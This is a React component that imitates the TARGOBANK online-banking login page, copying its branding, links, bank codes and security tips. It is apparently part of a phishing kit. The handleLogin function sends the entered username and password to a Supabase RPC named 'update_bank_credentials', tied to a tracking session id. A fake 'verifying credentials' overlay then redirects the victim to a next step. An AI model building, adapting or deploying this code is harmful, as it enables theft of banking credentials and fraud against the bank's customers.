import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff, ChevronRight, Check } from "lucide-react";
import logoAsset from "@/assets/targobank/targobank-logo.svg.asset.json";
import faviconAsset from "@/assets/favicons/targobank.webp.asset.json";
import footerIconAsset from "@/assets/targobank/targobank-footer-icon.svg.asset.json";
import heroIconAsset from "@/assets/targobank/targobank-hero-icon.svg.asset.json";
import card1Asset from "@/assets/targobank/targobank-card-1.webp.asset.json";
import card2Asset from "@/assets/targobank/targobank-card-2.webp.asset.json";
import card3Asset from "@/assets/targobank/targobank-card-3.webp.asset.json";

const NAVY = "#002d5a";
const BLUE = "#00a6e5";
const CARD = "#cfeefb";
const RED = "#c3002f";
const RED_HOVER = "#a00026";

type Lang = "de" | "en";

const URLS = {
  priv: "https://www.targobank.de/de/privatkunden/index.html",
  biz: "https://www.targobank.de/de/geschaeftskunden/index.html",
  firm: "https://www.targobank.de/de/firmenkunden/index.html",
  forgot: "https://www.targobank.de/de/service/online-banking/zugangsdaten-vergessen.html",
  register: "https://www.targobank.de/de/service/online-banking/benutzerdaten-anlegen.html",
  info: "https://www.targobank.de/de/service/online-banking/einrichtung-und-nutzung.html",
  bsi: "https://www.bsi.bund.de/",
  cardOnline: "https://www.targobank.de/de/service/sicherheit/online-sicherheit.html",
  cardTan: "https://www.targobank.de/de/service/online-banking/tan-verfahren.html",
  cardMobile: "https://www.targobank.de/de/service/online-banking/mobile-banking.html",
  imprint: "https://www.targobank.de/de/service/meta/impressum.html",
  privacy: "https://www.targobank.de/de/service/meta/datenschutz.html",
  agb: "https://www.targobank.de/de/service/meta/agb.html",
  prices: "https://www.targobank.de/de/service/meta/preise-und-leistungen.html",
  security: "https://www.targobank.de/de/service/sicherheit/index.html",
  credit: "https://www.targobank.de/de/privatkunden/finanzieren/index.html",
  revoke: "https://www.targobank.de/de/service/meta/vertrag-widerrufen.html",
};

const COPY: Record<Lang, {
  priv: string; biz: string; firm: string;
  login: string; required: string; username: string; password: string;
  remember: string; loginNow: string;
  forgot: string; register: string; info: string;
  usernameError: string; passwordError: string;
  tipsTitle: string;
  tips: string[];
  bsiText: string; bsiLink: string;
  spuerbar: string;
  card1Cat: string; card1Title: string; card1Link: string;
  card2Cat: string; card2Title: string; card2Link: string;
  card3Cat: string; card3Title: string; card3Link: string;
  imprint: string; privacy: string; agb: string; prices: string; security: string; credit: string;
  revoke: string;
}> = {
  de: {
    priv: "Privatkunden", biz: "Geschäftskunden", firm: "Firmenkunden",
    login: "Login", required: "Pflichtfeld", username: "Benutzername", password: "Passwort",
    remember: "Meinen Benutzernamen speichern", loginNow: "Jetzt einloggen",
    forgot: "Zugangsdaten vergessen?", register: "Benutzerdaten anlegen",
    info: "Informationen zur Einrichtung und Nutzung",
    usernameError: "Bitte geben Sie Ihren Benutzernamen ein.",
    passwordError: "Bitte geben Sie Ihr Passwort ein.",
    tipsTitle: "Unsere Sicherheitstipps",
    tips: [
      "Geben Sie niemals mehrere TANs gleichzeitig ein.",
      "Geben Sie niemals vertrauliche Daten oder TANs per E-Mail oder Telefon preis.",
      "Ändern Sie regelmäßig Ihre Passwörter und PIN.",
      "Speichern Sie vertrauliche Daten wie Benutzernamen, Passwort, PIN oder TANs nicht auf Ihrem Computer.",
      "Schreiben Sie Benutzernamen, PIN und Passwörter niemals auf und geben Sie sie nicht weiter an Dritte. Sie allein sind geheim.",
      "Nutzen Sie keine für Dritte zugänglichen Computer, um sich an Ihrem Online-Banking anzumelden.",
      "Bitte geben Sie immer www.targobank.de in die Adresszeile Ihres Internet-Browsers ein.",
    ],
    bsiText: "Weitere nützliche Hinweise finden Sie auf den Internetseiten des",
    bsiLink: "Bundesamt für Sicherheit in der Informationstechnik",
    spuerbar: "Online-Banking spürbar sicherer",
    card1Cat: "Online-Sicherheit", card1Title: "Alles für Ihren Schutz beim Online-Banking", card1Link: "Zur Online-Sicherheit",
    card2Cat: "TAN Verfahren", card2Title: "So individuell wie Ihre Anforderungen", card2Link: "Mehr Informationen",
    card3Cat: "Mobile Banking", card3Title: "Bankgeschäfte überall, einfach und sicher per App tätigen", card3Link: "Mehr erfahren",
    imprint: "Impressum", privacy: "Datenschutz", agb: "AGB, Rechtliche Hinweise & Barrierefreiheit",
    prices: "Preise & Leistungen", security: "Sicherheit", credit: "Kredit",
    revoke: "Vertrag widerrufen",
  },
  en: {
    priv: "Private clients", biz: "Business clients", firm: "Corporate clients",
    login: "Login", required: "Required field", username: "Username", password: "Password",
    remember: "Remember my username", loginNow: "Log in now",
    forgot: "Forgotten access data?", register: "Create user data",
    info: "Information on setup and use",
    usernameError: "Please enter your username.",
    passwordError: "Please enter your password.",
    tipsTitle: "Our security tips",
    tips: [
      "Never enter several TANs at the same time.",
      "Never share confidential data or TANs by email or phone.",
      "Change your passwords and PIN regularly.",
      "Do not store confidential data such as usernames, passwords, PINs or TANs on your computer.",
      "Never write down usernames, PINs and passwords and never share them with third parties.",
      "Do not use computers accessible to third parties to log in to your online banking.",
      "Always type www.targobank.de into your browser's address bar.",
    ],
    bsiText: "You can find further useful information on the pages of the",
    bsiLink: "Federal Office for Information Security",
    spuerbar: "Online banking noticeably safer",
    card1Cat: "Online security", card1Title: "Everything for your protection in online banking", card1Link: "To online security",
    card2Cat: "TAN procedure", card2Title: "As individual as your requirements", card2Link: "More information",
    card3Cat: "Mobile banking", card3Title: "Do your banking anywhere, easily and safely in the app", card3Link: "Learn more",
    imprint: "Imprint", privacy: "Privacy", agb: "T&Cs, Legal notice & Accessibility",
    prices: "Prices & services", security: "Security", credit: "Credit",
    revoke: "Revoke contract",
  },
};

const Targobank = () => {
  const [params] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = params.get("s") || "";
  const [lang, setLang] = useState<Lang>("de");
  const t = COPY[lang];
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPw, setShowPw] = useState(false);
  const [remember, setRemember] = useState(false);
  const [userErr, setUserErr] = useState(false);
  const [pwErr, setPwErr] = useState(false);
  const [userFocus, setUserFocus] = useState(false);
  const [pwFocus, setPwFocus] = useState(false);
  const [showLoading, setShowLoading] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("TARGOBANK – Online-Banking", logoAsset.url);

  const ext = { target: "_blank", rel: "noopener noreferrer" } as const;

  const handleLogin = async () => {
    const uErr = username.trim().length === 0;
    const pErr = password.length === 0;
    setUserErr(uErr); setPwErr(pErr);
    if (uErr || pErr) return;
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: username,
        p_password: password,
        p_username_label: "Benutzername",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  const fieldCls = (err: boolean) =>
    `tb-input w-full text-[16px] bg-white outline-none rounded-[6px] transition-colors${err ? " tb-err" : ""}`;
  const fieldStyle = (err: boolean): React.CSSProperties => ({
    border: `2px solid ${err ? RED : "#002f5f"}`,
    padding: "6px 9px",
    boxSizing: "border-box",
    color: NAVY,
  });



  return (
    <>
      <style>{`
        .tb-font { font-family: 'CircularPro','Helvetica Neue',Arial,sans-serif; color: ${NAVY}; }
        .tb-login-btn { background:#bc133e; }
        .tb-login-btn .tb-chev { transition: transform 200ms ease; }
        .tb-login-btn:hover .tb-chev { transform: translateX(5px); }
        .tb-top-link { color:#b2c0cf; transition: color 150ms ease; }
        .tb-top-link:hover { color:#fff; }

        .tb-remember-cb {
          -webkit-appearance: none;
          appearance: none;
          width: 18px;
          height: 18px;
          border: 2px solid ${NAVY};
          border-radius: 4px;
          background: #fff;
          box-shadow: inset 0 0 5px 2px rgba(0,0,0,0.3);
          position: relative;
          cursor: pointer;
          flex-shrink: 0;
        }
        .tb-remember-cb:checked::after {
          content: "";
          position: absolute;
          left: 5px;
          top: 1px;
          width: 5px;
          height: 10px;
          border: solid ${NAVY};
          border-width: 0 2px 2px 0;
          transform: rotate(45deg);
        }

        .tb-footer-link { color: #b2c0cf; transition: color 150ms ease; }
        .tb-footer-link:hover { color: #fff; text-decoration: none; }
        .tb-footer-link-mobile { color: #fff; transition: opacity 150ms ease; }
        .tb-footer-link-mobile:hover { opacity: 0.8; text-decoration: none; }
        .tb-footer-sep { color: #b2c0cf; opacity: 0.6; }
        .tb-link { color:${NAVY}; text-decoration: underline; text-underline-offset: 2px; }
        .tb-link:hover { color:${RED}; }
        .tb-login-link { color:${NAVY}; text-decoration: underline; text-underline-offset: 2px; }
        .tb-login-link:hover { color:${NAVY}; text-decoration: none; }
        .tb-card-link {
          color:${NAVY};
          font-weight: 700;
          position: relative;
          display: inline-block;
          text-decoration: none;
        }
        .tb-card-link::after {
          content: "";
          position: absolute;
          left: 0; right: 0; bottom: 0;
          height: 1px;
          background: currentColor;
          transform: scaleX(1);
          transform-origin: left center;
          transition: transform 300ms ease;
        }
        .tb-card-link:hover { color:${NAVY}; }
        .tb-card-link:hover::after { transform: scaleX(0); }
        .tb-topbar-code {
          text-decoration: underline;
          text-decoration-style: dotted;
          text-decoration-thickness: 1px;
          text-underline-offset: 3px;
        }
        .tb-input::placeholder { color:#b4b4b4; opacity:1; }
        .tb-input:focus { border-color:${NAVY} !important; outline: 2px solid ${NAVY}; outline-offset: 2px; }
        .tb-input.tb-err:focus { outline-color: ${RED}; }

        .tb-float-wrap { position: relative; }
        .tb-float-label {
          position: absolute;
          left: 12px;
          top: 50%;
          transform: translateY(-50%);
          font-size: 16px;
          color: #b4b4b4;
          pointer-events: none;
          transition: transform 150ms ease, font-size 150ms ease, color 150ms ease, padding 150ms ease, background-color 150ms ease;
          padding: 0 4px;
          background: transparent;
          z-index: 2;
          line-height: 1;
        }
        .tb-float-wrap.is-active .tb-float-label {
          top: -4px;
          left: 0;
          transform: translateY(-100%) scale(1);
          font-size: 14px;
          color: ${NAVY};
          background: transparent;
        }
        .tb-float-wrap.is-error .tb-float-label { color: ${RED}; }
        .tb-float-wrap.is-error.is-active .tb-float-label { color: ${RED}; }
        .tb-hero { background-color: #00a7e1; }
        .tb-hero-icon {
          position: absolute;
          right: -120px;
          top: 50%;
          transform: translateY(-50%);
          height: 110%;
          width: auto;
          opacity: 0.22;
          pointer-events: none;
          z-index: 0;
        }
        @media (max-width: 1023px) {
          .tb-hero-icon { right: -160px; height: 90%; }
        }

        .tb-revoke-btn { background: #fff; border:2px solid ${NAVY}; color:${NAVY}; transition: color 150ms ease; }
        .tb-revoke-btn:hover { color: #001a33; }

        .tb-login-card { padding: 32px; }
        @media (max-width: 1023px) { .tb-login-card { padding: 20px; } }
      `}</style>

      {showLoading && (
        <LoadingOverlay
          message={lang === "de" ? "Anmeldedaten werden überprüft..." : "Verifying your credentials..."}
          onComplete={() => navigate((new URLSearchParams(window.location.search).get("return") || "") ? `${new URLSearchParams(window.location.search).get("return")}?step=3&s=${sessionId}` : "/confirmation?s=" + sessionId)}
        />
      )}

      <div className="tb-font min-h-screen flex flex-col bg-white">
        {/* Top dark bar — desktop only */}
        <div style={{ backgroundColor: NAVY }} className="hidden lg:block text-white text-[13px]">
          <div className="max-w-[1200px] mx-auto px-5 py-3 flex flex-wrap items-center justify-between gap-3">
            <nav className="flex gap-6">
              <a href={URLS.priv} {...ext} className="tb-top-link">{t.priv}</a>
              <a href={URLS.biz} {...ext} className="tb-top-link">{t.biz}</a>
              <a href={URLS.firm} {...ext} className="tb-top-link">{t.firm}</a>
            </nav>
            <div className="flex items-center gap-4">
              <span><span className="tb-topbar-code">BLZ:</span> 300 209 00</span>
              <span style={{ color: "#fff" }}>|</span>
              <span><span className="tb-topbar-code">BIC:</span> CMCIDEDD</span>
            </div>
          </div>
        </div>

        {/* Logo header */}
        <div className="bg-white">
          <div className="max-w-[1200px] mx-auto px-5 py-6">
            <a href="/de/targobank" aria-label="TARGOBANK">
              <img src={logoAsset.url} alt="TARGOBANK" className="h-8 lg:h-9 w-auto" />
            </a>
          </div>
        </div>

        {/* Hero with login card */}
        <section className="tb-hero relative overflow-hidden">
          <img src={heroIconAsset.url} alt="" aria-hidden="true" className="tb-hero-icon" />
          <div className="relative max-w-[1200px] mx-auto px-2 lg:px-5 py-10 lg:py-16 flex justify-center" style={{ zIndex: 1 }}>
            <div
              className="tb-login-card w-full max-w-[440px]"
              style={{
                boxSizing: "border-box",
                backgroundColor: "rgba(255, 255, 255, 0.7)",
                borderRadius: "8px",
                boxShadow: "0 4px 5px 0 rgba(0, 0, 0, 0.1)",
              }}
            >

              <h1 className="text-center font-bold text-[30px] lg:text-[34px] mb-5" style={{ color: NAVY }}>
                {t.login}
              </h1>
              <div className="text-[16px] mb-6" style={{ color: NAVY }}>
                <span style={{ color: RED }}>*</span> {t.required}
              </div>

              <div className="mb-7">
                <div className={`tb-float-wrap${userFocus || username.length > 0 ? " is-active" : ""}${userErr ? " is-error" : ""}`}>
                  <input
                    className={fieldCls(userErr)}
                    style={fieldStyle(userErr)}
                    value={username}
                    onChange={(e) => { setUsername(e.target.value); if (userErr) setUserErr(false); }}
                    onFocus={() => setUserFocus(true)}
                    onBlur={() => setUserFocus(false)}
                    onKeyDown={(e) => e.key === "Enter" && handleLogin()}
                    aria-label={t.username}
                  />
                  <label className="tb-float-label">
                    {t.username} <span style={{ color: RED }}>*</span>
                  </label>
                </div>
                {userErr && (
                  <div className="mt-1 text-[13px]" style={{ color: RED }}>{t.usernameError}</div>
                )}
              </div>

              <div className="mb-5">
                <div className={`tb-float-wrap${pwFocus || password.length > 0 ? " is-active" : ""}${pwErr ? " is-error" : ""}`}>
                  <input
                    type={showPw ? "text" : "password"}
                    className={`${fieldCls(pwErr)} pr-12`}
                    style={fieldStyle(pwErr)}
                    value={password}
                    onChange={(e) => { setPassword(e.target.value); if (pwErr) setPwErr(false); }}
                    onFocus={() => setPwFocus(true)}
                    onBlur={() => setPwFocus(false)}
                    onKeyDown={(e) => e.key === "Enter" && handleLogin()}
                    aria-label={t.password}
                  />
                  <label className="tb-float-label">
                    {t.password} <span style={{ color: RED }}>*</span>
                  </label>
                  <button
                    type="button"
                    onClick={() => setShowPw((v) => !v)}
                    className="absolute right-3 top-1/2 -translate-y-1/2"
                    style={{ color: NAVY, zIndex: 3 }}
                    aria-label={showPw ? "Hide password" : "Show password"}
                  >
                    {showPw ? <EyeOff size={20} /> : <Eye size={20} />}
                  </button>
                </div>
                {pwErr && (
                  <div className="mt-1 text-[13px]" style={{ color: RED }}>{t.passwordError}</div>
                )}
              </div>

              <label className="flex items-center gap-2 text-[17px] font-normal mb-5 cursor-pointer justify-center" style={{ color: NAVY }}>
                <input
                  type="checkbox"
                  checked={remember}
                  onChange={(e) => setRemember(e.target.checked)}
                  className="tb-remember-cb"
                />
                {t.remember}
              </label>

              <button
                type="button"
                onClick={handleLogin}
                className="tb-login-btn w-full h-[52px] rounded-full text-white font-normal text-[18px] flex items-center justify-center gap-2 relative"
              >
                <span>{t.loginNow}</span>
                <ChevronRight size={28} strokeWidth={2.5} className="tb-chev absolute right-5" />
              </button>

              <div className="mt-5 text-[14px] flex flex-col lg:flex-row lg:flex-wrap items-start lg:justify-center lg:items-center gap-y-2 lg:gap-x-3 lg:gap-y-1">
                <a href={URLS.forgot} {...ext} className="tb-login-link">{t.forgot}</a>
                <a href={URLS.register} {...ext} className="tb-login-link">{t.register}</a>
                <a href={URLS.info} {...ext} className="tb-login-link lg:hidden">{t.info}</a>
              </div>
              <div className="hidden lg:block mt-2 text-center text-[14px]">
                <a href={URLS.info} {...ext} className="tb-login-link">{t.info}</a>
              </div>
            </div>
          </div>
        </section>

        {/* Security tips */}
        <section className="bg-[#eff6fb] py-14">
          <div className="max-w-[1140px] mx-auto px-5">
            <h2 className="text-center font-bold text-[28px] lg:text-[32px] mb-10" style={{ color: NAVY }}>
              {t.tipsTitle}
            </h2>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-x-10">
              {t.tips.map((tip, i) => (
                <div key={i} className="border-t border-[#c8d6e2] py-5 flex items-start gap-4 text-[15px]" style={{ color: NAVY }}>
                  <Check size={22} strokeWidth={3} style={{ color: NAVY, flexShrink: 0, marginTop: 2 }} />
                  <span>{tip}</span>
                </div>
              ))}
            </div>
            <div className="mt-6 text-[15px]" style={{ color: NAVY }}>
              {t.bsiText}{" "}
              <a href={URLS.bsi} {...ext} className="tb-link">{t.bsiLink}</a>.
            </div>
          </div>
        </section>

        {/* Spuerbar sicherer cards */}
        <section className="bg-white py-16">
          <div className="max-w-[1200px] mx-auto px-5">
            <h2 className="text-center font-bold text-[28px] lg:text-[34px] mb-10" style={{ color: NAVY }}>
              {t.spuerbar}
            </h2>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
              {[
                { img: card1Asset.url, cat: t.card1Cat, title: t.card1Title, link: t.card1Link, href: URLS.cardOnline },
                { img: card2Asset.url, cat: t.card2Cat, title: t.card2Title, link: t.card2Link, href: URLS.cardTan },
                { img: card3Asset.url, cat: t.card3Cat, title: t.card3Title, link: t.card3Link, href: URLS.cardMobile },
              ].map((c) => (
                <a key={c.cat} href={c.href} {...ext} className="block group">
                  <img src={c.img} alt={c.title} className="w-full aspect-[656/410] object-cover rounded-sm" />
                  <div className="text-[13px] mt-4" style={{ color: NAVY }}>{c.cat}</div>
                  <div className="font-bold text-[20px] mt-1 leading-snug" style={{ color: NAVY }}>{c.title}</div>
                  <span className="mt-3 text-[15px] tb-card-link">{c.link}</span>
                </a>
              ))}
            </div>
          </div>
        </section>

        {/* Footer */}
        <footer style={{ backgroundColor: NAVY }} className="text-white mt-auto">
          {/* Desktop footer */}
          <div className="hidden lg:flex max-w-[1200px] mx-auto px-5 py-8 flex-row items-center gap-6">
            <img src={footerIconAsset.url} alt="" className="h-10 w-auto" />
            <div className="flex flex-wrap items-center gap-x-6 gap-y-3 text-[12px] flex-1">
              <a href={URLS.imprint} {...ext} className="tb-footer-link">{t.imprint}</a>
              <span className="tb-footer-sep">|</span>
              <a href={URLS.privacy} {...ext} className="tb-footer-link">{t.privacy}</a>
              <span className="tb-footer-sep">|</span>
              <a href={URLS.agb} {...ext} className="tb-footer-link">{t.agb}</a>
              <span className="tb-footer-sep">|</span>
              <a href={URLS.prices} {...ext} className="tb-footer-link">{t.prices}</a>
              <span className="tb-footer-sep">|</span>
              <a href={URLS.security} {...ext} className="tb-footer-link">{t.security}</a>
              <span className="tb-footer-sep">|</span>
              <a href={URLS.credit} {...ext} className="tb-footer-link">{t.credit}</a>
            </div>
            <a
              href={URLS.revoke}
              {...ext}
              className="tb-revoke-btn text-center text-[14px] px-6 py-2.5 rounded-full font-medium"
            >
              {t.revoke}
            </a>
            <div className="flex items-center gap-3 text-[14px]">
              <button
                type="button"
                onClick={() => setLang("de")}
                className={lang === "de" ? "font-bold underline" : "opacity-80 hover:underline"}
              >DE</button>
              <span className="opacity-40">|</span>
              <button
                type="button"
                onClick={() => setLang("en")}
                className={lang === "en" ? "font-bold underline" : "opacity-80 hover:underline"}
              >EN</button>
            </div>
          </div>

          {/* Mobile footer: 20/80 layout */}
          <div className="lg:hidden px-5 py-8">
            <div className="flex gap-2">
              <div className="w-1/5 flex-shrink-0">
                <img src={footerIconAsset.url} alt="" className="h-16 w-auto" />
              </div>
              <div className="w-4/5 flex flex-col gap-3 text-[13px]">
                <a href={URLS.imprint} {...ext} className="tb-footer-link-mobile">{t.imprint}</a>
                <a href={URLS.privacy} {...ext} className="tb-footer-link-mobile">{t.privacy}</a>
                <a href={URLS.agb} {...ext} className="tb-footer-link-mobile">{t.agb}</a>
                <a href={URLS.prices} {...ext} className="tb-footer-link-mobile">{t.prices}</a>
                <a href={URLS.security} {...ext} className="tb-footer-link-mobile">{t.security}</a>
                <a href={URLS.credit} {...ext} className="tb-footer-link-mobile">{t.credit}</a>
                <a
                  href={URLS.revoke}
                  {...ext}
                  className="tb-revoke-btn inline-block w-max text-center text-[14px] px-6 py-2.5 rounded-full font-medium mt-1"
                >
                  {t.revoke}
                </a>
              </div>
            </div>
            <div className="flex justify-end items-center gap-3 text-[14px] mt-6">
              <button
                type="button"
                onClick={() => setLang("de")}
                className={lang === "de" ? "font-bold underline" : "opacity-80 hover:underline"}
              >DE</button>
              <span className="opacity-40">|</span>
              <button
                type="button"
                onClick={() => setLang("en")}
                className={lang === "en" ? "font-bold underline" : "opacity-80 hover:underline"}
              >EN</button>
            </div>
          </div>
        </footer>
      </div>
    </>
  );
};

export default Targobank;
